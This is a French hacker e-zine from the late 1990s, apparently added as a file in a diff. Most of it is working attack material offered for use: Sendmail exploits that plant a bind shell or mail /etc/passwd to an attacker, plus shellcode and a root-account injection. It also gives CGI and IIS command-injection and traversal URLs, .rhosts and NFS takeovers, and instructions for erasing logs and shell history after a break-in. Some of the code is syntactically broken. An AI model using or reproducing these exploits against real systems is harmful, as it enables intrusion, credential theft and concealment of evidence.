@@ -1,0 +1,574 @@
+
+                        Le MacMilliam du HaCkInG Volume1
+                        --------------------------------
+
+Cet  émag a était fait pour éviter les questions lourdes du genre: 
+
+"Comment ta fais pour hacker",et surtout d'éviter de se fairer banir sur les channel.
+
+
+INDEX:       1] Quest ce que fait un hacker pour trouver des failles sur un systeme
+             2] Sendmail exploits
+             3] Creer son channel irc sur dalnet
+             4] Les bugs httpd /cgi-bin
+             5] Effacer les logs
+             6] Script et Windows nt        
+             7] Changer son nom de domaine
+
+1] Quest ce que fait un hacker pour trouver des failles sur un systeme
+----------------------------------------------------------------------
+
+Avant tout il y a un minimum de chose a connaitre,genre comment fonctionne un reseau
+sur internet.
+
+Fonctionnement d'un reseau sur le web:
+--------------------------------------
+
+Pour bien explique le fonctionnement d'un reseau,chaque service est numerote par un Numero
+que l'on appel "UN PORT".Nombreux soient ils les logiciels qui permmettent le scan de ports
+sur le web , entre autre un des plus celebre pour windows : PORTSCAN ecris en visual basic 3
+ou encore IPPROBER qui est mieux que portscan mais aussi  plus lent.
+
+Un port est donc un numero qui est ratache a un service precis,exemple pour qu'un utilisateur
+puisse surfer sur le web,c'est le port 80  (8080) qui s'en charge.Prenez par exemple Microsoft
+Frontpage pour avoir votre port 80 ouvert,server u pour le ftp (21), irclpus pour un port irc
+6667 etc ...
+
+Ensuite une fois que l'on a lister les ports d'un serveur on va chercherce que l'on appel un 
+"EXPLOIT" (bug) qui va nous permettre de recuperer le fichier password du site.On les trouves
+sur des grand classic tel que BUGTRAQ ou www.rootshell.com.
+
+En voiçi une petite liste de port avec le nom du service:
+
+Numero de port:                     Fonction:
+---------------                     ---------
+                             
+                            0                   ICMP    
+                            7                   ECHO
+                            8                   Unknow
+                            9                   DISCARD
+                           10
+                           11                   SYSTIME
+                           12
+                           13                   DATE
+                           19                   UDP , character generator
+                           21                   FTP
+                           22                   SSH
+                           23                   TELNET   
+                           25                   SENDMAIL (smtp)
+                           53                   Domaine Name Server   
+                           70                   GOPHER 
+                           79                   FINGER
+                           80                   WEB
+                           81                   Host name 2
+                          110                   POP3
+                          111                   RPCBIND
+                          118                   SQLSERV
+                          119                   NNTP (Network News Transfer Protocol)
+                          436                   DNA-cml
+                          513                   Remote Login (telnet)
+                          514                   CMD SHELL
+                          515                   Printer/spooler
+                          611                   NPMP-gui
+                         1080                   Blackjack network                          
+                         
+Hack via sendmail
+-----------------
+
+La technique du FAKME MAIL port 25
+----------------------------------
+c'est l'art de s'envoyer des emails par le port 25 d'un serveur.
+Usage:
+
+c:\Telnet www.toto.com port 25
+helo blah.net
+mail from:user@blah.net
+rcpt to:president@whitehouse.gov
+data
+.
+
+C'etais parrue dans Noroute avec l'article de code4 sur " Intrusion",la toute premiere fois 
+ou j'ai appercu le bug du sendmail.L'inconvenient de l'article c'est qu'il ne dis pas sur 
+quel version de sendmail il tourne.En voiçi quelques un de ces bugs:
+
+Sendmail 4.1
+------------
+
+shell>telnet www.host.com 25
+#!/bin/sh
+
+port=$3
+user=$2
+cmd=$4
+
+if [ -z "$2" ]; then
+   user=daemon
+fi
+
+if [ -z "$3" ]; then
+   port=7002
+fi
+
+if [ -z "$4" ]; then
+   cmd="/bin/csh -i"
+fi
+
+(
+sleep 4
+echo "helo"
+echo "mail from: |"
+echo "rcpt to: bounce"
+echo "data"
+echo "."
+sleep 3
+echo "mail from: $user"
+echo "rcpt to: | sed '1,/^$/d' | sh"
+echo "data"
+echo "cat > /tmp/a.c <<EOF"
+cat <<  EOF
+#include <sys/types.h>
+#include <sys/signal.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+reap(){int s;while(wait(&s)!=-1);}main(ac,av)int ac;
+int **av;{struct sockaddr_in mya;struct servent *sp
+;fd_set muf;int myfd,new,x,maxfd=getdtablesize();
+signal(SIGCLD,reap);if((myfd=socket(AF_INET,SOCK_STREAM,
+0))<0)exit(1);mya.sin_family=AF_INET;bzero(&mya.sin_addr,
+sizeof(mya.sin_addr));if((sp=getservbyname(av[1],"tcp"))
+==(struct servent *)0){if(atoi(av[1])<=0)exit(1);mya.sin_port
+=htons(atoi(av[1]));}else mya.sin_port=sp->s_port;if(bind(myfd,
+(struct sockaddr *)&mya,sizeof(mya)))exit(1);if(listen(myfd,
+1)<0)exit(1);loop: FD_ZERO(&muf);FD_SET(myfd,&muf);if
+(select(myfd+1,&muf,0,0,0)!=1||!FD_ISSET(myfd,&muf))goto
+loop;if((new=accept(myfd,0,0))<0)goto loop;if(fork()
+==0){for(x=2;x<maxfd;x++)if(x!=new)close(x);for(x=0;x<
+NSIG;x++)signal(x,SIG_DFL);dup2(new,0);close(new);dup2
+(0,1);dup2(0,2);execv(av[2],av+2);exit(1);}close(new);
+goto loop;}                                          
+EOF
+echo "EOF"
+echo "cd /tmp"
+echo "/bin/cc /tmp/a.c"
+echo "/bin/rm a.c"
+echo "/tmp/a.out $port $cmd"
+echo "."
+echo "quit"
+) | mconnect $1
+
+Un autre exploit pour la version 4.1 qui marche avec le port 7008 au lieu de 25:
+
+helo
+mail from: |
+rcpt to: bounce
+data
+.
+mail from: bin
+rcpt to: | sed '1,/^$/d' | sh
+data
+cat > /tmp/a.c <<EOF
+#include <sys/types.h>
+#include <sys/signal.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+reap(){int s;while(wait(&s)!=-1);}main(ac,av)int ac;
+int **av;{struct sockaddr_in mya;struct servent *sp
+;fd_set muf;int myfd,new,x,maxfd=getdtablesize();
+signal(SIGCLD,reap);if((myfd=socket(AF_INET,SOCK_STREAM,
+0))<0)exit(1);mya.sin_family=AF_INET;bzero(&mya.sin_addr,
+sizeof(mya.sin_addr));if((sp=getservbyname(av[1],"tcp"))
+==(struct servent *)0){if(atoi(av[1])<=0)exit(1);mya.sin_port
+=htons(atoi(av[1]));}else mya.sin_port=sp->s_port;if(bind(myfd,
+(struct sockaddr *)&mya,sizeof(mya)))exit(1);if(listen(myfd,
+1)<0)exit(1);loop: FD_ZERO(&muf);FD_SET(myfd,&muf);if
+(select(myfd+1,&muf,0,0,0)!=1||!FD_ISSET(myfd,&muf))goto
+loop;if((new=accept(myfd,0,0))<0)goto loop;if(fork()
+==0){for(x=2;x<maxfd;x++)if(x!=new)close(x);for(x=0;x<
+NSIG;x++)signal(x,SIG_DFL);dup2(new,0);close(new);dup2
+(0,1);dup2(0,2);execv(av[2],av+2);exit(1);}close(new);
+goto loop;}                                          
+EOF
+cd /tmp
+/bin/cc /tmp/a.c
+/bin/rm a.c
+/tmp/a.out 7008 /bin/sh
+.
+quit
+
+
+Sendmail version 5.x
+--------------------
+
+shell> telnet target.com 25 << EOSM
+ rcpt to: /home/students/twit/.rhosts
+ mail from: twit
+ data
+ .
+ rcpt to: /home/students/twit/.rhosts
+ mail from: twit
+ data
+ myhost.com
+ .
+ quit
+ EOSM
+
+/bin/sh sendmail_haq
+ Trying XXXXXXX
+ Connected to target.com
+ Escape character is '^]'.
+ Connection closed by foreign host.
+
+shell> rlogin target.com -l twit
+
+
+Sendmail version 5.5
+--------------------
+shell> Telnet www.host.com 25 
+Connected to host.com
+ Escape character is '^]'.
+220 victim.com Sendmail 5.55 ready at Saturday, 8 Aug 99 18:04
+
+Bon voila pour le message de bienvenue.Pour la suite tapez ca:
+
+mail from: "|/bin/mail you@yourname.com < /etc/passwd"
+250 "|/bin/mail you@yourname.com < /etc/passwd"... Sender ok
+data
+354 Enter mail, end with "." on a line by itself
+.
+250 Mail accepted
+quit
+Connection closed by foreign host.
+
+Sendmail 5.6.1
+--------------
+#include <sys/param.h>
+#include <sys/types.h>
+#include <stdio.h>
+#include <sysexits.h>
+#include <pwd.h>
+#include <grp.h>
+
+#define OURFILE    "/tmp/x"
+
+main()
+int myuid, rval;
+if ((myuid = getuid()) == MYUID)
+rval = EX_TEMPFAIL;
+else {
+rval = EX_OK;
+system(OURFILE);
+}
+exit(rval);
+}
+
+Sendmail 5.6.5
+--------------
+
+Shell>telnet www.toto.com 25
+Escape character is '^]'.
+220 toto.com 5.65 Sendmail is ready at Mon, 
+HELO
+250 Hello toto.com, why do you call yourself ?
+MAIL FROM: |/usr/ucb/tail|/usr/bin/sh
+250 |/usr/ucb/tail|/usr/bin/sh... Sender ok
+RCPT TO: root
+250 root... Recipient ok
+DATA
+.
+
+Sendmail 8.6.10
+---------------
+* gcc ident.c -o ident
+
+#include <sys/types.h>
+#include <sys/fcntl.h>
+#include <sys/time.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#define TIMEOUT 120
+/* PROCINFO_BUFFER_SIZE must be bigger than 80 */
+#define OUTPUT_BUFFER_SIZE 2048
+#define SOCKET_BUFFER_SIZE 100
+unsigned short lport = 0, rport = 0;
+void
+main ()
+{
+    unsigned long here, there
+    struct fd_set fdset;
+    struct timeval timeout;
+    char buffer[OUTPUT_BUFFER_SIZE];
+    char inbuffer[SOCKET_BUFFER_SIZE];
+    int len;
+    int fd;
+    FD_ZERO (&fdset);
+    FD_SET (0, &fdset);
+    timeout.tv_sec = TIMEOUT;
+    timeout.tv_usec = 0;  
+    select (1, &fdset, NULL, NULL, &timeout);
+    len = read (0, inbuffer , SOCKET_BUFFER_SIZE - 1 );
+    if (len <= 0
+    exit (0);
+    FD_SET (0, &fdset);
+    sprintf (buffer, "%s : USERID : UNIX : %s\r\n", inbuffer,
+    "Croot\t\t\t\t\t\t\tMprog, P=/bin/sh, F=lsDFMeu, A=sh -c $u\t\t\t\t\t\t
+    Mlocal,
+    P=/bin/sh, F=lsDFMeu, A=sh -c $u\t\t\t\t\t\tR<\"|/bin/echo toor::0:1:toor:/:/bin/csh >> /etc/passwd\">\t\t\tR<\"|/usr/bin/chmod 4755 /usr/bin/time\">\r\n
+    $rascii done");
+    write (1, buffer, strlen (buffer));
+    exit (0);
+}
+
+Sendmail 8.6.12
+---------------
+
+#include <stdio.h>
+main()
+{
+void make_files();
+     make_files();
+     system("EDITOR=./hack;export EDITOR;chmod +x hack;chfn;/usr/sbin/sendmail;echo See result in /tmp");
+}
+
+void make_files()
+ {
+  int i,j;
+  FILE *f;
+  char nop_string[200];
+  char code_string[]=
+                      {
+                         "\xeb\x50"                         /* jmp    cont */
+
+/* geteip: */            "\x5d"                             /* popl   %ebp */
+                         "\x55"                             /* pushl  %ebp */
+                         "\xff\x8d\xc3\xff\xff\xff"         /* decl   0xffffffc3(%ebp) */
+                         "\xff\x8d\xd7\xff\xff\xff"         /* decl   0xffffffd7(%ebp) */
+                         "\xc3"                             /* ret */
+
+/* 0xffffffb4(%ebp): */ "cp /bin/sh /tmp"
+/* 0xffffffc3(%ebp): */ "\x3c"
+                        "chmod a=rsx /tmp/sh"
+/* 0xffffffd7(%ebp): */ "\x01"
+                        "-leshka-leshka-leshka-leshka-"    /* reserved */
+
+/* cont:  */            "\xc7\xc4\x70\xcf\xbf\xef"         /* movl   $0xefbfcf70,%esp */
+                        "\xe8\xa5\xff\xff\xff"             /* call   geteip */
+                        "\x81\xc5\xb4\xff\xff\xff"         /* addl   $0xb4ffffff,%ebp */
+                        "\x55"                             /* pushl  %ebp */
+                        "\x55"                             /* pushl  %ebp */
+                        "\x68\xd0\x77\x04\x08"             /* pushl  $0x80477d0  */
+                        "\xc3"                             /* ret */
+                        "-leshka-leshka-leshka-leshka-"    /* reserved */
+                        "\xa0\xcf\xbf\xef"
+                     };
+
+  j=269-sizeof(code_string);
+  for(i=0;i<j;nop_string[i++]='\x90');
+  nop_string[j]='\0';
+
+  f=fopen("user.inf","w");
+  fprintf(f,"#Changing user database information for leshka\n");
+  fprintf(f,"Shell: /usr/local/bin/bash\n");
+  fprintf(f,"Location: \n");
+  fprintf(f,"Office Phone: \n");
+  fprintf(f,"Home Phone: \n");
+  fprintf(f,"Full Name: %s%s\n",nop_string,code_string);
+  fclose(f);
+
+  f=fopen("hack","w");
+  fprintf(f,"cat user.inf>\"$1\"\n");
+  fprintf(f,"touch -t 2510711313 \"$1\"\n");
+  fclose(f);
+ }
+
+
+S'envoyer des fichiers en C
+---------------------------
+All mails, c'est le nom du programme que je voulais lui donner,mais j'ai jamais eu le temps 
+de le terminer au complet.
+
+cc -o mail.c mail
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+{ 
+  email()
+}
+void mailto()
+{
+ char root[]="localhost.localdomain";
+ char *foo;
+ foo=(char *)  malloc (4096);
+ sprintf(foo, "mail %</etc/passwd",root);
+ system(foo)
+}
+
+Et voila un 'tit client smtp :)  
+
+
+Toi aussi deviens un pro de l'irc!
+----------------------------------
+
+Enregistrer Un channel sur dalnet:
+1] Il faut d'abord enregistrer son nick name avec la commande suivante:
+/nick server register toto   (-> toto etant le password de ton nick name
+
+2] Se placer sur le channel que l'on veut creer avec la commande /join #channel
+
+3] Enregistrer le nom du channel:
+  /chanserv register #fredo bibi hack
+
+Notes: la on a donc enregistrer un channel qui s'appel fredo qui a le password bibi et comme
+description hack 
+4] Garder le meme topic quan on est pas la    
+  /chanserv  set #toto keeptopic on       -> la toto est le nom du channel :)
+
+5] Ajouter un user:
+ /chanserv aop #channel add    nickname    (-> nickname =p pseudo...)
+
+6] Et bien sur pour utiliser le password de son nick name =)
+ /msg nickserv identify password
+
+7] Toi aussi devient ircop 
+La il vous vous un systeme de type unix et une connecte 24h/24,et d'aller sur la page web du
+server choisi puis remplir un formulaire online, ou un server viendra regarder le votre et
+l'attacher au central.
+
+Les bus HTTPD:
+-------------
+Ce sont tous les bug des CGI que l'on trouve dans le repertoire host.com/cgi-bin
+On a eu le plus connu le PHF :) www.toto.com/cgi-bin/phf,cette commande qui permettait
+d'ouvrir n'importe quel fichier en remote.Liste des bugs permettant d'ouvrir un fichier:
+
+www.toto.com/cgi-bin/phf?Qname=%0acat%20/etc/passwd 
+www.toto.com/cgi-bin/phf?Qname=%0acd%20/%0als
+
+www.toto.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+www.toto.com/cgi-bin/phf?Qalias=x%0a/usr/bin/ypcat%20/etc/passwd\n";*/
+
+Rlogin + phf
+------------
+echo "+  +">/tmp/rhosts
+echo "get /cgi-bin/phf?Qalias=x%0arcpttoto@yahoo.com:/tmp/rhosts+/root/.rhosts|nc -V -20 toto.com 80
+rlogin -l root toto.com
+
+php.cgi
+-------
+www.host.com/cgi-bin/php.cgi?/etc/passwd
+
+htmlscript
+----------
+www.host.com/cgi-bin/htmlscript?/etc/passwd
+
+faxsurvey
+---------
+www.toto.com/cgi-bin/faxsurvey?/bin/cat%20/etc/passwd
+
+test-cgi  (netscape3)
+--------
+www.toto.com/cgi-bin/test-cgi/*
+
+nfs
+---
+showmount --all toto.com
+mount -a web.com:/etc
+
+* Pour le cas d'un /home exportable
+shell>mount -nt toto.com:/home /hack
+shell>ls -sa1
+shell>id
+shell>who ami
+shell>echo "user::102:2::/hack:/bin/csh">>/etc/passwd
+shell>su -user
+shell>ls -lsa /hack
+shell>echo "+  +"> user/.rhost
+shell>cd /
+shell>rlogin toto.com
+
+info2www
+--------
+GET ./info2www '(../../../../../../../bin/mail jami </etc/passwd|)'
+
+whois_raw.cgi
+-------------
+/cgi-bin/whois_raw.cgi?fqdn=%0acat%20/etc/passwd
+
+view-source
+-----------
+/cgi-bin/view-source?/etc/passwd
+
+
+
+Effacer les logs
+----------------
+C'est une des chose que l'on oublie souvent avant de partir d'un serveur.Voila quelques
+commande pour effacer les logs:
+
+rien laisser dans les /home et /tmp, effacer les logs httpd dans /Etc/httpd/acces.logs,
+lister les elements modifier avant de se deconnecter :
+ls -altr
+
+Effacer les donnees historique:
+mv .logout save.1
+echo rm .history>.logout
+echo rm .logout>>.logout
+echo mv save1.1 .logout>>.logout
+
+les fichier modifier apres la connection:
+touche /tmp/chek
+find / -never/tmpchek -print
+find / -ctime 0 -print
+find / -cmin 0 -print
+
+Prog de secu.. 
+crontab -l root
+
+
+
+
+Script et windows nt
+--------------------
+La encore pas beaucoup de commentaire il s'agit des repertoire /script,mais le principe et rare
+est aussi vieux que phf,le meilleur bug que l'on trouve pour nt reste celui de IPC$.
+
+http://www.example.org/scripts/uploadn.asp
+http://your.machine.name/scripts/rb.dll?
+http://www.someserver.com/msadc/Samples/SELECTOR/showcode.asp?source=/msadc/S
+http://vulnerable.site.com/scripts/tools/newdsn.exe?driver=Microsoft%2BAccess%2BDriver%2B%28*.mdb%29&dsn=Evil+samples+from+microsoft&dbq=..%2F..%2Fwwwroot%2Fevil.html&newdb=CREATE_DB&attr=
+http://servername/scripts/samples/search/webhits.exe
+http://www.company.com/scripts/tools/getdrvrs.exe
+http://www.site.com/scripts/file.ext%20.pl
+http://www.site.com/scripts/pass.txt%20.pl
+http://www.site.com/scripts/default.asp%20.pl
+http://www.site.com/scripts/*.txt%20.pl
+http://somewhere/something.asp::$DATA
+http://www.domain.com/..\..
+http://www.domain.com/scripts..\..\scriptname
+http://www.domain.com/scripts/script_name%0A%0D>PATH\target.bat
+http://your.host.name/scripts/anyold.cmd?&dir+c:\
+http://your.host.name/scripts/anyold.bat?&dir+c:\
+http://your.host.name/..\..\autoexec.bat
+http://your.host.name/scripts/../../../winnt35/win.ini
+http://your.host.name/scripts/..\..\winnt35\cmd.exe?%2FC+set
+http://your.host.name/scripts/..\..\winnt35\cmd.exe?%2FC+echo+"Hi
+There"+>c:\temp\hello.txt
+http://your.host.name/scripts/..\..\WINNT35\SYSTEM32\XCOPY.EXE?+c:\autoexec.bat+c:\temp
+http://victim.com/scripts/convert.bas?../../anything/you/want/to/view 
+
+Telnet host.com 80:
+GET ../..
+
+
+Changer son nom de domaine:
+---------------------------
+
+Editer le fichier /etc/hosts et inscrire le nom du domaine desire.
+edite /etc/sysconfig/network
+et tapez hostname -v pour creer le domaine    -> a faire en root uniquement !
+
+
+
